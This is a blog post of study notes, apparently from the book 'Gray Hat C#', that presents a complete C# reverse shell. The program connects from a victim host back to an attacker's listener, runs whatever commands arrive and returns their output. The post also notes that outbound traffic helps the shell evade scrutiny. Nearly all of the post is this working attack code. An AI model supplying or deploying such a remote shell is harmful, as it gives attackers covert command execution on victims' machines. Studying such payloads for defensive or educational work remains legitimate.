---
title: Writing a program which allows an attacker to start a listener and listen for a connection back from a victim host.
date: 2021-07-09 10:45:47 +07:00
categories: greyhatcch4
#modified: 20-08-29 09:24:47 +07:00
#tags: [blog, netlify, jekyll, github]
description: Reverse Shell.
---


## We write a program which allows an attacker to start a listener and listen for a connection back from a victim host.

- We use the following classes:

> TCPClient - to create a new TCPClient object.

> Stream - to create a stream to read/wrtie to.

> StreamReader - read commands from incoming stream.

> Process and ProcessStartInfo(add/control certain options in Process()) - run commands from an attacker using a new process.

- We use the Split method to split commands into their respective filenames and arguments.

- Helps in evasion, egress traffic from a victim host is less scrutinized.

## Code:

```csharp
using System;
using System.IO;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net;
using System.Net.Sockets;
using System.Diagnostics;

namespace Connect_Back_Payload
{
    public class MainClas
    {
        public static void Main(string[] args)
        {
            Console.WriteLine("[+] Welcome to your connect back shell\n- Enter a command on your attacker terminal to continue\n");
            // Convert only port from str to int
            using (TcpClient client = new TcpClient(args[0], int.Parse(args[1])))
            {
                //Read/Write to stream
                using (Stream stream = client.GetStream())
                {
                    //Read cmds from attacker
                    using (StreamReader rdr = new StreamReader(stream))
                    {
                        //Read from stream as long as attacker sends cmds
                        while (true)
                        {
                            string cmd = rdr.ReadLine();
                            // If empty
                            if (string.IsNullOrEmpty(cmd))
                            {
                                rdr.Close();
                                stream.Close();
                                client.Close();
                                return;
                            }
                            // Contains only whitespace
                            if (string.IsNullOrWhiteSpace(cmd))
                                continue;

                            //Split cmd into cmd and args
                            string[] split = cmd.Trim().Split(' ');
                            string filename = split.First();
                            string arg = string.Join(" ", split.Skip(1));

                            //Run cmd and return output
                            try
                            {
                                Process prc = new Process();
                                prc.StartInfo = new ProcessStartInfo();
                                prc.StartInfo.FileName = filename;
                                prc.StartInfo.Arguments = arg;
                                //Execute cmds in same shell context
                                prc.StartInfo.UseShellExecute = false;
                                prc.StartInfo.RedirectStandardOutput = true;
                                prc.Start();
                                //Copy stdout to stream and send to attacker
                                prc.StandardOutput.BaseStream.CopyTo(stream);
                                prc.WaitForExit();
                            }
                            catch
                            {
                                string error = "[+] Error running command: " + cmd + "\n";
                                byte[] errorBytes = Encoding.ASCII.GetBytes(error);
                                stream.Write(errorBytes, 0, errorBytes.Length);
                            }
                                
                            
                        }
                    }


                }

            }
        }
    }
}

```

## Output:

![Image](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/master/_posts/coding/csharp/greyhatc/Ch4/Connect-back-payload/connect_back.png)
